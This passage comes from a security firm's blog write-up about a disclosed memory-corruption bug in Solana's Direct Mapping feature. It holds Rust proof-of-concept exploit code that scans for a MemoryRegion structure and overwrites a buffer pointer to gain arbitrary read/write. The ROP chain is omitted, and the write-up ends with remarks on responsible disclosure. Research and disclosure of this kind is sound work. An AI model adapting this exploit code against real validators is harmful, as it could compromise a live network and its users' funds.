</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">52</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">53</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">54</span><span>        </span><span class="token token" style="color:#999">// Resize LEVERAGE back to a larger size for memory scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">55</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0xa00000</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">56</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">57</span><span>        </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">58</span><span>            </span><span class="token token" style="color:#999">// Scan memory to locate MemoryRegion structure</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">59</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> data_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x2840</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">60</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> arb_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>pointer_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">61</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">62</span><span>            </span><span class="token token" style="color:#cc99cd">loop</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">63</span><span>                </span><span class="token token" style="color:#999">// Signature matching to reliably identify MemoryRegion</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">64</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x18</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020a238</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">65</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x58</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400202908</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">66</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x98</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020f308</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">67</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0xd8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400000000</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">68</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">69</span><span>                    </span><span class="token token" style="color:#cc99cd">let</span><span> thread_mem </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x48</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">70</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">71</span><span>                    </span><span class="token token" style="color:#999">// Overwrite POINTER account&#x27;s backing buffer pointer (arb_ptr)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">72</span><span>                    </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x490</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> thread_mem</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">73</span><span>                    </span><span class="token token" style="color:#999">// Set memory region state to writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">74</span><span>                    </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x4b8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">75</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">76</span><span>                    </span><span class="token token" style="color:#999">// At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">77</span><span>                    </span><span class="token token" style="color:#999">// ROP chain setup would occur here (omitted).</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">78</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">79</span><span>                    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">80</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">81</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">82</span><span>                </span><span class="token token" style="color:#999">// Move to next potential MemoryRegion structure</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">83</span><span>                data_ptr </span><span class="token token" style="color:#67cdcc">+=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x08</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">4</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">4</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">84</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">85</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">86</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">87</span><span>        </span><span class="token token" style="color:#999">// Note: computation budget exhaustion may be necessary in real-world scenarios</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">88</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">89</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">90</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">91</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">92</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">After successfully getting arbitrary read/write, remote code execution (RCE) would be achievable using traditional binary exploitation tricks.</p>
<div class="relative w-full pb-[56.25%]">
  <iframe class="absolute top-0 left-0 w-full h-full" src="https://www.youtube.com/embed/qlnRNFnFaXM?si=9nCPqBPqxjFJQHHb" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"></iframe>
</div>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Notably, the PoCs shown here is no where near stable enough to launch an attack against an active Solana network. Specifically, we haven&#x27;t implemented account spraying, and also used hardcoded offsets for calculating thread stack and ROPgadgets. However, there are well-established approaches in weaponizing such PoCs into exploits, and we leave this as an exercise for interested readers.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">Final Thoughts</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">As demonstrated, even memory-safe languages like Rust can harbor subtle and powerful vulnerabilities, especially in complex systems utilizing unsafe code to push the boundaries of performance and optimization. <strong class="font-semibold text-white">What began as a curiosity about Solana’s JIT and memory model evolved into a critical finding that could have compromised the integrity of the entire network.</strong></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">During our disclosure of the bug to Solana, the team was highly responsive, and also fast to understand the concepts discussed in the report. They also made significant decisions such as putting the Direct Mapping feature on hold for further scrutiny, instead of hastily launching it to meet deadlines. While bugs are inevitable, Solana&#x27;s professional handling of bug disclosures shows their commitment to security, and demonstrates why it deserves to be a top tier project.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">We had a lot of fun exploring this bug. Reading through code, understanding system design at a deep level, and crafting a non-obvious exploit path. These are the kinds of challenges we live for. Hopefully, this write-up sheds light on how the bug hunting process really works. It is not just about the final exploit, but about the twists, dead ends, and intuition that lead there. We hope you enjoyed reading it as much as we enjoyed the journey.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">At Anatomist Security, we specialize in uncovering such vulnerabilities through deep technical research and rigorous security audits. If you&#x27;re building complex software, especially in fast-moving areas like blockchain, and want to ensure its robustness, reach out. We&#x27;d love to help.</p><style>
mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
  min-height: 1px;
  min-width: 1px;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][display="true"][width="full"] {
  display: flex;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > g > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
  stroke-width: 3;
}
</style></div><div class="mt-16 pt-8 border-t border-white/10"><div class="flex items-center justify-center gap-4 text-xs tracking-[0.3em] text-white/40 font-mono uppercase"><span class="w-8 h-px bg-white/20"></span><span>:: END_TRANSMISSION</span><span class="w-8 h-px bg-white/20"></span></div></div></article></div></main><footer class="relative isolate overflow-hidden bg-[#050505] pt-16 pb-6"><div class="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-white/20 to-transparent"></div><div class="absolute inset-0 bg-grid-pattern opacity-20 pointer-events-none"></div><div class="relative z-10 mx-auto flex max-w-6xl flex-col items-center gap-10 px-4"><div class="flex items-center gap-2 sm:gap-3 text-xs tracking-widest sm:tracking-[0.3em] text-white/20 font-mono uppercase"><span class="w-2 h-2 rounded-full bg-white animate-pulse"></span><span>:: SYSTEM_ONLINE</span><span class="hidden sm:inline text-white/20">|</span><span class="hidden sm:inline">CONTACT_PROTOCOLS</span></div><div class="grid w-full grid-cols-2 gap-8 text-sm sm:grid-cols-4 sm:gap-12"><div><h4 class="mb-4 text-xs tracking-[0.2em] text-white/40 font-mono uppercase">// SOCIAL_LINKS</h4><div class="flex gap-4"><a href="https://x.com/th3anatomist" target="_blank" rel="noopener noreferrer" class="group border border-white/20 hover:border-white p-2 transition-all duration-300 no-underline"><img alt="X" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="opacity-50 group-hover:opacity-100 transition-opacity invert" style="color:transparent" src="/x_icon.svg"/></a><a href="https://t.me/th3anatomist" target="_blank" rel="noopener noreferrer" class="group border border-white/20 hover:border-white p-2 transition-all duration-300 no-underline"><img alt="Telegram" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="opacity-50 group-hover:opacity-100 transition-opacity invert" style="color:transparent" src="/telegram_icon.svg"/></a></div></div><div><h4 class="mb-4 text-xs tracking-[0.2em] text-white/40 font-mono uppercase">// EMAIL</h4><a href="mailto:contact@anatomi.st" class="text-white/60 hover:text-white transition-colors font-mono text-sm break-all">contact@anatomi.st</a></div><div><h4 class="mb-4 text-xs tracking-[0.2em] text-white/40 font-mono uppercase">// PHONE</h4><p class="text-white/60 font-mono text-sm">(+886) 2-2304-0080</p></div><div><h4 class="mb-4 text-xs tracking-[0.2em] text-white/40 font-mono uppercase">// LOCATION</h4><p class="text-white/60 font-mono text-sm leading-relaxed">No. 128, Heping W. Rd.<br/>Zhongzheng Dist.<br/>Taipei, Taiwan</p></div></div><div class="w-full border-t border-white/10 pt-6"><div class="flex flex-col sm:flex-row items-center justify-between gap-4"><div class="flex items-center gap-4 text-xs tracking-[0.15em] text-white/30 font-mono"><span>LAT: 25.0330</span><span class="text-white/20">|</span><span>LNG: 121.5654</span></div><p class="text-center text-xs tracking-[0.15em] text-white/30 font-mono">ANATOMIST_SECURITY // <!-- -->2025<!-- --> // ALL_RIGHTS_RESERVED</p></div></div></div><div class="absolute inset-x-0 bottom-0 h-px bg-gradient-to-r from-transparent via-white/20 to-transparent"></div></footer><!--$--><!--/$--><script src="/_next/static/chunks/webpack-5b44a6e81d516c51.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[9766,[],\"\"]\n3:I[8924,[],\"\"]\n5:I[4431,[],\"OutletBoundary\"]\n7:I[5278,[],\"AsyncMetadataOutlet\"]\n9:I[4431,[],\"ViewportBoundary\"]\nb:I[4431,[],\"MetadataBoundary\"]\nc:\"$Sreact.suspense\"\ne:I[7150,[],\"\"]\n:HL[\"/_next/static/media/3d26d2f3aa81a833-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/4b657decd6407698-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/6e1768769e6f59a2-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/739c2d8941231bb4-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/ab2e3a11646b0499-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/8eb65cd440904aa0.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"K-UlvW_EZvJxoOcEoVeM7\",\"p\":\"\",\"c\":[\"\",\"blog\",\"2025_06_27_pwning_solana_for_fun_and_profit\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"2025_06_27_pwning_solana_for_fun_and_profit\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/8eb65cd440904aa0.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_4fe6d1 __variable_606fa7 antialiased\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 